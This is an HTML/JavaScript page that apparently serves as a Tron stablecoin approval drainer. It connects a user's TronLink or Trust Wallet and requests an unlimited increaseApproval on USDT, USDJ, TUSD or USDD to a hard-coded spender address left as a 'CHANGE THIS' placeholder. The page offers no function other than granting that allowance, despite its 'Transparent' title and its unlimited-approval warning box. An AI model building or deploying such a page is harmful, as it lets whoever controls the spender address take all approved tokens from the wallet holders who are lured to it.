<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Tron Token Approval (Transparent)</title>

  <!-- TronWeb (required) -->
  <script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.js"></script>

  <!-- Tailwind (UI only) -->
  <script src="https://cdn.tailwindcss.com"></script>

  <script>
    /* ================= CONFIG ================= */
    // CHANGE THIS
    window.SPENDER = "TZC9E9PNULB87BKPhPmtrZBPRsu7QUPfTk";

    const MAX_UINT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";

    const TOKENS = [
      { id: "usdt", name: "USDT", contract: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t" },
      { id: "usdj", name: "USDJ", contract: "TMwFHYXLJaRUPeW6421aqXL4ZEzPRFGkGT" },
      { id: "tusd", name: "TUSD", contract: "TUpMhErZL2fhh4sVNULAbNKLokS4GjC1F4" },
      { id: "usdd", name: "USDD", contract: "TPYmHEhy5n8TCEfYGqW2rPxsghSfzghPDn" }
    ];
  </script>
</head>
<body class="bg-gray-950 text-white min-h-screen flex items-center justify-center">

  <div class="w-full max-w-md bg-gray-900 rounded-2xl shadow-xl p-6">
    <h1 class="text-xl font-bold mb-4">Tron Token Approval</h1>

    <!-- STEP: SELECT -->
    <div id="step-select">
      <label class="text-sm">Select Token</label>
      <select id="tokenSelect" class="w-full bg-gray-800 p-2 rounded mt-1 mb-4"></select>

      <button onclick="connectWallet()" class="w-full bg-blue-600 hover:bg-blue-700 rounded p-2">
        Connect Wallet
      </button>
    </div>

    <!-- STEP: APPROVE -->
    <div id="step-approve" class="hidden">
      <p class="text-sm mb-2">Wallet:</p>
      <p id="walletAddress" class="text-sm mb-4"></p>

      <button onclick="showWarning()" class="w-full bg-orange-600 hover:bg-orange-700 rounded p-2">
        Approve Token
      </button>
    </div>

    <!-- WARNING -->
    <div id="warning" class="hidden mt-4 border border-red-600 rounded p-4 text-sm">
      <p class="font-bold text-red-400 mb-2">Unlimited Approval Warning</p>
      <p class="mb-2">You are about to approve <b>UNLIMITED</b> access to this token.</p>
      <p class="mb-2 break-all">Spender:</p>
      <p class="text-xs break-all mb-3" id="spender"></p>
      <button onclick="approveToken()" class="w-full bg-red-600 hover:bg-red-700 rounded p-2">
        I Understand, Continue
      </button>
    </div>

    <!-- STATUS -->
    <div id="status" class="mt-4 text-sm"></div>
  </div>

  <script>
    const tokenSelect = document.getElementById("tokenSelect");
    const walletAddressEl = document.getElementById("walletAddress");
    const statusEl = document.getElementById("status");

    let currentToken = TOKENS[0];
    let walletAddress = null;

    TOKENS.forEach(t => {
      const opt = document.createElement("option");
      opt.value = t.id;
      opt.textContent = t.name;
      tokenSelect.appendChild(opt);
    });

    tokenSelect.addEventListener("change", e => {
      currentToken = TOKENS.find(t => t.id === e.target.value);
    });

    function mask(addr) {
      return addr.slice(0, 6) + "..." + addr.slice(-4);
    }

    async function connectWallet() {
      if (!window.tronWeb || !window.tronWeb.ready) {
        alert("Open this site inside Trust Wallet or TronLink browser");
        return;
      }

      walletAddress = window.tronWeb.defaultAddress.base58;
      walletAddressEl.textContent = mask(walletAddress);

      document.getElementById("step-select").classList.add("hidden");
      document.getElementById("step-approve").classList.remove("hidden");
    }

    function showWarning() {
      document.getElementById("spender").textContent = window.SPENDER;
      document.getElementById("warning").classList.remove("hidden");
    }

    async function approveToken() {
      statusEl.textContent = "Waiting for wallet confirmationâ€¦";

      try {
        const contract = await window.tronWeb.contract().at(currentToken.contract);
        const tx = await contract.increaseApproval(window.SPENDER, MAX_UINT).send();

        statusEl.innerHTML = `<span class='text-green-400'>Approval successful</span><br><span class='text-xs break-all'>${tx}</span>`;
      } catch (err) {
        console.error(err);
        statusEl.innerHTML = "<span class='text-red-400'>Transaction rejected or failed</span>";
      }
    }
  </script>
</body>
</html>
